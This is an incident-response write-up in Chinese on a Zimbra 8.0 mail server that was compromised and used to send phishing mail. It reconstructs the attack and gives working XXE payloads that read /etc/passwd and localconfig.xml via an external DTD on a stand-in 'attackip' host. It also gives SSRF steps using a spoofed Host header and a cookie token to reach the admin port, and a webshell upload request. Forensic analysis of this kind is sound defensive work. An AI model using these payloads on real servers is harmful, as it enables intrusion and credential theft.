0x01 调查取证
=========

1、对涉事服务器的/var/log 日志分析，在邮件日志中发现，大量向后缀为gov.cn的邮箱发送钓鱼邮件。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a1890c45b8f46ee8c110d5b7d2cf801a47ffe0f7.png)

2、登录邮箱发现被退回邮件达3万多封，查看钓鱼邮件内容，发现存在钓鱼链接。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-955ec3444d80b9bc5912f61823ea9d47cb90bb39.png)

3、链接是http://XXXXXX/?i=i&amp;m=XXXX@mail.com， 其中参数m就是被钓鱼的邮箱账号，初步判断是通过钓鱼网站获取受害者的账号密码。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d3d65bfef9a34a3673cc1eb74a53957f95fa4308.png)

4.使用威胁情报平台搜索钓鱼网站站点的域名，表示该站点是恶意的。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6ac811b3b2546619ea05037f379c9c63c56c3b88.png)

5、查看邮箱的登录日志，发现大量的10.17.xxxxxxx登录登录错误日志，经过检查，发现错误日志是由于离职员工建立的发送邮件的日志，因为离职员工的邮箱账号被注销，所以大量的错误登录日志。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f82846d546cc588e07aac761e433236cb8faebee.png)

6、查看Zimbra版本，发现是8.0老版本， 该版本存在许多漏洞，比如XXE、SSRF，使用组合拳还可以RCE。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-46d0cc56dc1887d270ce47dc7398f65daa73338f.png)

7、在服务器的文件中找到了木马文件，一种常见的jsp木马。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1186e77a8031c6f23e8f8ea76371805228e68cfa.png)

0x02 漏洞分析
=========

XXE
---

1、直接跟进到漏洞接口/Autodiscover/Autodiscover.xml，POST发送一个空的xml，我们发现返回了No Email address is specified in the Request

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a64edaf2208afc61fa64ac5c1456840bedda91f8.png)

2、我们定位到这句话，发现这里存在XXE漏洞

```js

public void doPost(HttpServletRequest req, HttpServletResponse resp){

  reqBytes = ByteUtil.getContent(req.getInputStream(), req.getContentLength());
  Document doc = docBuilder.parse(new InputSource(new StringReader(content)));
  //获取Request标签中的内容 
  NodeList nList = doc.getElementsByTagName("Request");
    for (int i = 0; i < nList.getLength(); i++)
      {
        Node node = nList.item(i);
        if (node.getNodeType() == 1)
        {
          Element element = (Element)node;
          email = getTagValue("EMailAddress", element);
            //获取AcceptableResponseSchema的值赋值给responseSchema，这里就造成了XXE漏洞，没有对AcceptableResponseSchema的值进行任何过滤
          responseSchema = getTagValue("AcceptableResponseSchema", element);
        }
      }
    //
    if ((email == null) || (email.length() == 0))
    {
      log.warn("No Email address is specified in the Request, %s", new Object\[\] { content });
      sendError(resp, 400, "No Email address is specified in the Request");
      return;
    }
    if ((responseSchema != null) && (responseSchema.length() > 0)) {
         //当responseSchema不符合标准的时候，就会爆出错误，并将responseSchema回显，就造成了XXE漏洞
      if ((!responseSchema.equals("http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006")) && (!responseSchema.equals("http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a")))
      {
        log.warn("Requested response schema not available " + responseSchema);
        sendError(resp, 503, "Requested response schema not available " + responseSchema);
        return;
      }
}
```

3、<https://wiki.zimbra.com/wiki/Autodiscover> 官网给出的Autodiscover的写法，

```<Autodiscover
<Response xmlns="http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006">
<Culture>en:en</Culture>
<User>
<DisplayName>admin</DisplayName>
<EMailAddress>admin@zimbra.io</EMailAddress>
</User>
<Action>
<Settings>
<Server>
<Type>MobileSync</Type>
<Url>https://zimbra86.zimbra.io:8443/Microsoft-Server-ActiveSync</Url>
<Name>https://zimbra86.zimbra.io:8443/Microsoft-Server-ActiveSync</Name>
</Server>
</Settings>
</Action>
</Response>
</Autodiscover>
```

我们可以写出如下payload，利用xxe漏洞

```<!DOCTYPE
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >\]>
 <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
      <EMailAddress>123</EMailAddress>
      <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
    </Request>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0150d296b2f02537e02f752812738b5f302040f1.png)

4、Zimbra为SOAP通信设置了一个全局管理员，用户名为“zimbra”，并随机生成密码。这些信息均存储在名为localconfig.xml的本地文件中。在某些条件下可以使用此类凭证，通过/service/extension/clientUploader/upload接口上传木马文件RCE。但是存在权限设置，通过管理端口才能发起请求，默认情况下端口是7071。

5、我们首先利用XXE读取localconfig.xml的本地文件，但是在 XML 中，字符 "&lt;" 和 "&amp;" 是非法的，所以读取一些带有特殊字符的文件时，就会报错“元素内容必须由格式正确的字符数据或标记组成”。在Java环境的那我们可以使用CDATA读取，来绕过字符限制。

术语 CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。某些文本，比如 JavaScript 代码，包含大量 "&lt;" 或 "&amp;" 字符。为了避免错误，可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由 "&lt;!\[CDATA\[" 开始，由 "\]\]&gt;" 结束，使用参数实体进行调用CDATA。

```php
dtd文件

<?xml version="1.0" encoding="UTF-8"?>  <!ENTITY all "%start;%goodies;%end;">

payload

   
<!ENTITY % goodies SYSTEM "file:../conf/localconfig.xml">  
<!ENTITY % end "\]\]>">  
<!ENTITY % dtd SYSTEM "http://attackip/12.dtd"> 
%dtd; \]> 
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&all;</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6a162b17e185dfd32486eede6bf4720e7913f485.png)

SSRF
----

假如目标网站关闭了7071端口，我们还可以利用SSRF漏洞来访问。ProxyServlet.doProxy() 它能够将请求代理到另一个指定位置。这个 servlet 在普通的 webapp 上可用，因此可以从公共访问。但是存在额外的限制，代码中会检查代理目标是否与一组预定义的白名单匹配，也就是说，请求需要来自管理员才能去处理。但是针对管理员检查存在代码缺陷。第一步会检查请求是否来自端口 7071，但是它使用\[ServletRequest.getServerPort()\]([https://docs.oracle.com/javaee/6/api/javax/servlet/ServletRequest.html#getServerPort())获取Host头中](https://docs.oracle.com/javaee/6/api/javax/servlet/ServletRequest.html#getServerPort())%E8%8E%B7%E5%8F%96Host%E5%A4%B4%E4%B8%AD) ':' 之后的端口，然后只有从参数中获取 admin令牌才会进行检查，我们完全可以通过 cookie 发送令牌！简而言之，如果我们发送一个带有 'host: ip:7071' 主机头和 cookie 中的有效令牌的请求，我们可以将请求代理到任意目标。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-92b4a8596d0c72987a4fbb6ddc17d6e4ff591338.png)

简单来说，ProxyServle会把请求转发到指定的target，这里就会造成一个SSRF，可以利用SSRF访问7071管理端口。将Host修改为:7071为结尾的值，假装自己是从管理端口进入（ServletRequest.getServerPort()取Request中Host端口的问题），同时在Cookie中使用一个低权限的Token，即可进行SSRF。

1、首先获取一个低权限autotoken值，可以使用soap接口发送AuthRequest进行获取，填入zimbra\_admin\_name和zimbra\_ldap\_password。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-32a6a6c8392a25557409871f389b6f36a6e9bafc.png)

2、然后使用POST请求访问 /service/proxy?target=<https://127.0.0.1:7071/service/admin/soap>，  
***一定要注意是https，  
将Host修改为 ip:7071，  
将cookie 改为ZM\_ADMIN\_AUTH\_TOKEN=上步获取到的ZM\_AUTH\_TOKEN，  
将xmlns改为xmlns="urn:zimbraAdmin"，***  
就能够获取到真正的ZM\_ADMIN\_AUTH\_TOKEN

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-92579620c48a37eced0a02089df739d1dbc7bd47.png)

3、使用ZM\_ADMIN\_AUTH\_TOKEN，上传木马，poc这里就不放了，需要注意的是post请求7071端口r\\=requests.post("[https://ip:7071/service/extension/clientUploader/upload",files\\=file,headers\\=headers,verify\\=False](https://ip:7071/service/extension/clientUploader/upload))

然后连接木马的时候，需要导入ZM\_ADMIN\_AUTH\_TOKEN，木马地址为<https://ip:7071/>downloads/XXX.jsp

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6d37f96e2f485b827daae12a8ee81e875cc51607.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8f4e1e4811bfe2102bbf5a16c5b461fb69fbd5b7.png)

0x03 总结
=======

最终判定为攻击者利用Zimbra漏洞，XXE+SSRF进而getshell，获取服务器权限控制邮箱，然后发送钓鱼邮件。

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-89dba754399dc1196de4c55c7d27fd475f381dea.png)